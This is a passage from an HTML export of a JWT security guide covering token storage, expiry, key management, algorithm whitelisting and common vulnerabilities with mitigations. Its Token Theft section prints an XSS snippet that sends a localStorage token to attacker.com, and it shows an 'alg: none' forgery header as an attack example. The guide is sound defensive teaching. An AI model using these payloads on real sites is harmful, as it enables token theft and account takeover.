+    decoded = jwt.decode(
+        token,
+        secret,
+        algorithms=[&#x27;HS256&#x27;],  # Whitelist algorithms
+        issuer=&#x27;my-api&#x27;,       # Validate issuer
+        audience=&#x27;my-app&#x27;,     # Validate audience
+        options={&#x27;verify_exp&#x27;: True}
+    )
+
+    print(f&#x27;Decoded payload: {decoded}&#x27;)
+
+except jwt.ExpiredSignatureError:
+    print(&#x27;Token has expired&#x27;)
+except jwt.InvalidTokenError:
+    print(&#x27;Invalid token&#x27;)
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-800a-bf50-d5118eead1c9" class=""><strong>Decoding Without Verification (Dangerous!)</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-801d-bcd7-d01fbbfc8a58" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ❌ WRONG: Decoding without verification
+const decoded = jwt.decode(token);
+// This does NOT verify the signature!
+// Never trust claims from decode() alone
+
+// ✅ CORRECT: Always verify
+const decoded = jwt.verify(token, secret, { algorithms: [&#x27;HS256&#x27;] });
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-80c4-8953-de6f9141fa96"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-80c3-be6e-e078db958ec4" class=""><strong>JWT Security Considerations</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80e2-a3c3-d3814810452d" class=""><strong>1. Token Storage</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80ea-923e-ea9eb5ef2f73" class=""><strong>Options:</strong></p></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8004-925a-cbdd5ac9193f" class=""><strong>localStorage</strong></h3></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8039-8bb1-e1fae4775c82" class="bulleted-list"><li style="list-style-type:disc">✅ Easy to access in JavaScript</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8059-9fa3-c2b9158141ed" class="bulleted-list"><li style="list-style-type:disc">❌ Vulnerable to XSS attacks</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8052-a47a-f6bd2abf6219" class="bulleted-list"><li style="list-style-type:disc">❌ Accessible to any script on the page</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-800d-a80b-e5ad999877a6" class=""><strong>sessionStorage</strong></h3></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80fd-86f4-dde4fd326bb8" class="bulleted-list"><li style="list-style-type:disc">✅ Cleared when tab closes</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80c2-8b61-e7f23a8c8511" class="bulleted-list"><li style="list-style-type:disc">❌ Still vulnerable to XSS</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80fa-a896-ebf166b0cb81" class="bulleted-list"><li style="list-style-type:disc">❌ Not accessible across tabs</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8092-9e04-db5d10c2cabb" class=""><strong>httpOnly Cookies</strong></h3></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80c2-91aa-d649d9678689" class="bulleted-list"><li style="list-style-type:disc">✅ Not accessible to JavaScript (XSS protection)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-809d-8518-e36e398c349b" class="bulleted-list"><li style="list-style-type:disc">✅ Automatically sent with requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-800a-9b68-fcae10e476b3" class="bulleted-list"><li style="list-style-type:disc">⚠️ Vulnerable to CSRF (use SameSite attribute)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-800d-a043-d6d6ae1d4d76" class="bulleted-list"><li style="list-style-type:disc">✅ Recommended for sensitive tokens</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80b5-bd09-f6b74560921f" class=""><strong>Memory (JavaScript variable)</strong></h3></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8031-98a5-d4c7583c4d19" class="bulleted-list"><li style="list-style-type:disc">✅ Not persisted</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-805f-86d6-e5e38a22a0cd" class="bulleted-list"><li style="list-style-type:disc">✅ Not accessible after page reload</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80db-a9ff-d93268009b46" class="bulleted-list"><li style="list-style-type:disc">❌ Lost on page refresh</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8089-8bce-d9e0f3950089" class=""><strong>Recommendation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80df-9e9c-fb43ee7734d7" class="bulleted-list"><li style="list-style-type:disc">Use <strong>httpOnly cookies</strong> for access tokens</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80df-a7cc-d7516d7fd189" class="bulleted-list"><li style="list-style-type:disc">Use <strong>httpOnly cookies</strong> with <code>SameSite=Strict</code> or <code>SameSite=Lax</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8057-9506-d1f70c45e3d0" class="bulleted-list"><li style="list-style-type:disc">Add <code>Secure</code> flag for HTTPS-only transmission</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80ab-a5e3-d49d9427dab4" class=""><strong>2. Token Transmission</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-804b-b05e-fa4646d5b6d0" class=""><strong>Always use HTTPS:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8006-9186-ffd7bd179816" class="bulleted-list"><li style="list-style-type:disc">JWTs contain sensitive information</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8007-86e5-c45e9d128134" class="bulleted-list"><li style="list-style-type:disc">HTTPS encrypts data in transit</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80aa-9cf7-cf323c214940" class="bulleted-list"><li style="list-style-type:disc">Prevents man-in-the-middle attacks</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8035-9403-f125f096b8e2" class=""><strong>Authorization Header (Recommended):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8089-90d9-d783bcb67846" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">fetch(&#x27;https://api.example.com/protected&#x27;, {
+  headers: {
+    &#x27;Authorization&#x27;: `Bearer ${token}`
+  }
+});
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-804d-a4ed-c0964f56b389" class=""><strong>Cookie (Alternative):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8042-ba8a-d9141b948142" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Set cookie with httpOnly flag
+res.cookie(&#x27;token&#x27;, token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: &#x27;strict&#x27;,
+  maxAge: 3600000
+});
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80e7-bfbd-c21be168cff0" class=""><strong>3. Token Expiration</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-807f-917a-c8035269f32a" class=""><strong>Short-lived Access Tokens:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80e7-88c7-e7c2140d3fe2" class="bulleted-list"><li style="list-style-type:disc">Recommended: 15 minutes to 1 hour</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80aa-8312-d238cfaf4d95" class="bulleted-list"><li style="list-style-type:disc">Reduces risk if token is stolen</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-808b-ab00-fc18818267ac" class="bulleted-list"><li style="list-style-type:disc">Forces regular refresh</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8032-b720-e9f50d6e78f3" class=""><strong>Long-lived Refresh Tokens:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8033-9c16-c547097e8eb7" class="bulleted-list"><li style="list-style-type:disc">Stored securely (httpOnly cookie)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8005-a3cf-ca95c34f6d78" class="bulleted-list"><li style="list-style-type:disc">Used to obtain new access tokens</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-802c-82d4-c3237369a504" class="bulleted-list"><li style="list-style-type:disc">Can be revoked server-side</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80af-bf6f-d36595af683e" class="bulleted-list"><li style="list-style-type:disc">Recommended: 7-30 days</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8001-a328-d84de1dc1f74" class=""><strong>Refresh Token Flow:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80cf-901e-e2d192b5b954" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">1. User logs in
+   → Server returns: accessToken (15min) + refreshToken (7days)
+
+2. Access token expires
+   → Client sends refreshToken to /refresh endpoint
+   → Server validates refreshToken
+   → Server returns new accessToken
+
+3. Refresh token expires
+   → User must login again
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80bb-b7ea-efadb3825cc7" class=""><strong>4. Secret Key Management</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8004-9a90-f75791d7d4c6" class=""><strong>Key Requirements:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8045-ac9d-c0d1ee93a26a" class="bulleted-list"><li style="list-style-type:disc">✅ Long and random (minimum 256 bits for HMAC)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8028-a64d-db45f1add217" class="bulleted-list"><li style="list-style-type:disc">✅ Cryptographically secure random generation</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ac-8c81-dc24ca09c113" class="bulleted-list"><li style="list-style-type:disc">✅ Stored securely (environment variables, secret managers)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-808c-b6e8-dd361f3ce8ae" class="bulleted-list"><li style="list-style-type:disc">✅ Never committed to version control</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8014-aa81-df6f46517b46" class="bulleted-list"><li style="list-style-type:disc">✅ Rotated periodically</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8018-a294-f78767b96239" class=""><strong>Key Generation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80a0-b4b0-c732252dd96d" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Generate secure random key
+const crypto = require(&#x27;crypto&#x27;);
+const secretKey = crypto.randomBytes(64).toString(&#x27;hex&#x27;);
+// 128 characters (512 bits)
+
+// Or use crypto.randomBytes directly
+const secretKey = crypto.randomBytes(32); // 256 bits
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80c2-971b-c42b4635b527" class=""><strong>Key Storage:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80a8-b831-c15f945247b1" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ✅ Use environment variables
+const secret = process.env.JWT_SECRET;
+
+// ✅ Use secret management services
+// - AWS Secrets Manager
+// - HashiCorp Vault
+// - Azure Key Vault
+// - Google Cloud Secret Manager
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-801c-ba8d-f412833149f3" class=""><strong>5. Algorithm Whitelisting</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8092-87b1-ff69d8092e59" class=""><strong>Always explicitly whitelist algorithms:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8028-9db4-f6ee1d5d97c0" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ✅ CORRECT: Whitelist algorithms
+jwt.verify(token, secret, {
+  algorithms: [&#x27;HS256&#x27;, &#x27;RS256&#x27;]  // Only allow these
+});
+
+// ❌ WRONG: May allow &#x27;none&#x27; algorithm
+jwt.verify(token, secret);  // Dangerous!
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8089-b0fe-e22a84e1403e" class=""><strong>6. Claim Validation</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8069-a056-e933204846db" class=""><strong>Always validate all claims:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-809d-9e79-fa05b2c4c92b" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">jwt.verify(token, secret, {
+  algorithms: [&#x27;HS256&#x27;],
+  issuer: &#x27;my-api&#x27;,        // Validate issuer
+  audience: &#x27;my-app&#x27;,      // Validate audience
+  maxAge: &#x27;2h&#x27;,            // Maximum age from iat
+  clockTolerance: 60       // Allow 60 seconds clock skew
+});
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-80e8-9a34-c8a8dca800a6"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-80bf-bf06-cd7e5d239ab6" class=""><strong>Common Vulnerabilities and Mitigations</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8009-933e-e4e39f546733" class=""><strong>1. Information Leakage</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80a9-8cd8-da4693150d6a" class=""><strong>Problem:</strong> Sensitive information stored in JWT payload can be decoded by anyone.</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8001-b80d-db3b875168e2" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8024-87ee-c434cea5a1cb" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">{
+  &quot;userId&quot;: &quot;123&quot;,
+  &quot;password&quot;: &quot;hashed_password&quot;,  // ❌ Never store!
+  &quot;creditCard&quot;: &quot;1234-5678-9012-3456&quot;,  // ❌ Never store!
+  &quot;ssn&quot;: &quot;123-45-6789&quot;  // ❌ Never store!
+}
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80a2-97eb-cb64dce78a46" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8087-98d0-edb6db51924d" class="bulleted-list"><li style="list-style-type:disc">✅ Store only necessary identifiers</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8097-b2c8-c66abaf31a24" class="bulleted-list"><li style="list-style-type:disc">✅ Never store passwords, PII, or sensitive data</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80de-b761-c2aebe265185" class="bulleted-list"><li style="list-style-type:disc">✅ Use principle of least privilege</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8087-9a14-d8eee7ef37b6" class="bulleted-list"><li style="list-style-type:disc">✅ Use JWE (JSON Web Encryption) if encryption is needed</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8003-9195-d3baa10d5c15" class=""><strong>2. Algorithm Confusion Attack</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-804b-99df-cb0c02d5a4d6" class=""><strong>Problem:</strong> Server accepts tokens signed with different algorithms (e.g., &#x27;none&#x27; or weak algorithms).</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80c5-8e17-f374e4ccce14" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8001-a5c3-f125d66b5981" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Attacker changes algorithm to &#x27;none&#x27;
+{
+  &quot;alg&quot;: &quot;none&quot;,  // Changed from HS256
+  &quot;typ&quot;: &quot;JWT&quot;
+}
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8058-9735-f706ef2f0534" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-803f-8dd2-cecee40eed69" class="bulleted-list"><li style="list-style-type:disc">✅ Always whitelist algorithms explicitly</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80f6-9eb2-c6850fa02ad7" class="bulleted-list"><li style="list-style-type:disc">✅ Never allow &#x27;none&#x27; algorithm</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8095-876f-c2e3cd6e5118" class="bulleted-list"><li style="list-style-type:disc">✅ Use strong algorithms (HS256, RS256, ES256)</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80ea-90c1-c9d881e8a2f9" class=""><strong>3. Token Theft</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80b2-94da-e5533618a2d3" class=""><strong>Problem:</strong> If token is stolen (XSS, network sniffing, etc.), attacker can use it until expiration.</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8086-82c0-c349777af8a8" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8096-9b2a-d4c995f414de" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// XSS attack steals token from localStorage
+&lt;script&gt;
+  fetch(&#x27;https://attacker.com/steal?token=&#x27; + localStorage.getItem(&#x27;token&#x27;));
+&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80a7-819c-d00d6894be5e" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80c2-8fd3-c88f018788c6" class="bulleted-list"><li style="list-style-type:disc">✅ Use httpOnly cookies instead of localStorage</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-803d-b3a4-fe1984d7e8fc" class="bulleted-list"><li style="list-style-type:disc">✅ Use short token expiration times</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ee-b40c-f38af4ca8d77" class="bulleted-list"><li style="list-style-type:disc">✅ Implement token refresh mechanism</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8031-b11b-e56192bd9c6d" class="bulleted-list"><li style="list-style-type:disc">✅ Use HTTPS for all token transmission</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8075-86a0-c2aed9bfdf5e" class="bulleted-list"><li style="list-style-type:disc">✅ Implement Content Security Policy (CSP)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8041-8048-fc3fb3177aa8" class="bulleted-list"><li style="list-style-type:disc">✅ Implement token blacklisting (optional, requires storage)</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-803f-ab01-c28367fa4849" class=""><strong>4. Replay Attacks</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8098-b6c8-f4b0dbad524f" class=""><strong>Problem:</strong> Valid token can be reused multiple times even after action is completed.</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8030-a6d4-ef8bb941a773" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8052-92b0-e8f5fc81bd0a" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Attacker intercepts valid token
+// Reuses it multiple times to perform actions
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80c3-a07f-e025cce7b567" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8046-80b9-ca9290bee3df" class="bulleted-list"><li style="list-style-type:disc">✅ Use short token expiration</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80c2-85fe-c5c3d46355f4" class="bulleted-list"><li style="list-style-type:disc">✅ Implement <code>jti</code> (JWT ID) claim for one-time tokens</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ca-9c2c-e22be8b4140c" class="bulleted-list"><li style="list-style-type:disc">✅ Use <code>nonce</code> for critical operations</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80f2-b60f-f6c8e2547f46" class="bulleted-list"><li style="list-style-type:disc">✅ Implement token blacklisting for critical operations</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8018-a44f-e9fcc5fe54ab" class=""><strong>5. Token Expiration Not Validated</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8049-80d1-c2621b1bfbff" class=""><strong>Problem:</strong> Server doesn&#x27;t validate expiration claim, allowing expired tokens.</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-805d-be0b-c58a1f630682" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" 